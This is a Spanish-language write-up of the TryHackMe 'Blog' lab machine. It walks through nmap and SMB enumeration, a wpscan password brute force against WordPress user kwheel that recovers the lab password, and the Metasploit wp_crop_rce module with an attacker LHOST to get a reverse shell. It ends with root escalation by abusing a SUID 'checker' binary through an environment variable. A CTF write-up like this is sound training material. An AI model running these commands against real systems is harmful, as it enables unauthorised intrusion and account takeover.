---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Medium
  - HTTP
  - SMB
  - CMS
  - WordPress
  - Steganography
  - ReverseShell
  - SUID
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
	- [[#Enumeración#SMB|SMB]]
	- [[#Enumeración#WordPress|WordPress]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Steganography|Steganography]]
	- [[#Explotación#WordPress Crop-Image Shell Upload|WordPress Crop-Image Shell Upload]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#SUID|SUID]]

---
# Blog

![](Screenshots/618f1cc93596ff4082250bce9d869767.png)

> En este write-up se documenta la resolución paso a paso de la máquina **Blog** de [TryHackMe](https://tryhackme.com/room/blog), clasificada como dificultad **Medium**. Durante la explotación se abusa de una vulnerabilidad en **WordPress (Crop-Image Shell Upload)** y se utiliza una mala configuración **SUID** para escalar privilegios hasta **root**.

---
## Enumeración
### Ping

`ping -c 1 10.80.191.113`

![](Screenshots/Pasted%20image%2020251229125641.png)
### Nmap

`nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 10.80.191.113 -oG allPorts`

![](Screenshots/Pasted%20image%2020251229125824.png)

`nmap -p22,80,139,445 -sCV 10.80.191.113 -oN targeted`

![](Screenshots/Pasted%20image%2020251229125844.png)
### HTTP

`http://10.80.191.113/`

![](Screenshots/Pasted%20image%2020251229125931.png)

`echo "10.80.191.113 blog.thm" >> /etc/hosts`

![](Screenshots/Pasted%20image%2020251229130050.png)

![](Screenshots/Pasted%20image%2020251229130231.png)
### SMB

`rpcclient -U "" -N 10.80.191.113`

![](Screenshots/Pasted%20image%2020251229130657.png)

`smbclient -L 10.80.191.113 -U 'anonymous'`

![](Screenshots/Pasted%20image%2020251229130850.png)

`smbmap -H 10.80.191.113 -u 'anonymous'`

![](Screenshots/Pasted%20image%2020251229130925.png)

`smbclient //10.80.191.113/BillySMB`

![](Screenshots/Pasted%20image%2020251229131048.png)
### WordPress

`wpscan --url http://blog.thm/ -U kwheel -P /usr/share/wordlists/rockyou.txt`

![](Screenshots/Pasted%20image%2020251229180527.png)
![](Screenshots/Pasted%20image%2020251229180557.png)

Se encuentran los siguientes usuarios:
- `kwheel`.
- `bjoel`.

Se procede a realizar *fuerza bruta* para averiguar la contraseña.

`wpscan --url http://blog.thm/ -U kwheel -P /usr/share/wordlists/rockyou.txt`

![](Screenshots/Pasted%20image%2020251229180730.png)

---
## Explotación
### Steganography

`steghide extract -sf Alice-White-Rabbit.jpg`

![](Screenshots/Pasted%20image%2020251229131342.png)

`cat rabbit_hole.txt`

![](Screenshots/Pasted%20image%2020251229131406.png)
### WordPress Crop-Image Shell Upload

Se accede al panel del usuario para iniciar sesión.

`http://blog.thm/wp-login.php`

![](Screenshots/Pasted%20image%2020251229182414.png)

No se encuentra nada relevante.

`searchsploit "WordPress 5.0"`

![](Screenshots/Pasted%20image%2020251229182454.png)

```Shell
msfconsole
search "WordPress 5.0.0"
use 0 | use exploit/multi/http/wp_crop_rce
show options
set LHOST [IP_MÁQUINA_ATACANTE]
set USERNAME kwheel
set PASSWORD cutiepie1
set RHOSTS [IP_MÁQUINA_VÍCTIMA]
exploit
```

![](Screenshots/Pasted%20image%2020251229182739.png)

---
## Escalada de Privilegios
### SUID

`find / -perm -4000 2>/dev/null`

![](Screenshots/Pasted%20image%2020251230102629.png)

`ltrace checker`

![](Screenshots/Pasted%20image%2020251230102708.png)

`export admin=hello`

`checker`

![](Screenshots/Pasted%20image%2020251230102750.png)

La *flag* de **root**, se encuentra en `/root/root.txt`.

La *flag* de *usuario*: `find / -name user.txt 2>/dev/null`.

![](Screenshots/Pasted%20image%2020251230102909.png)

---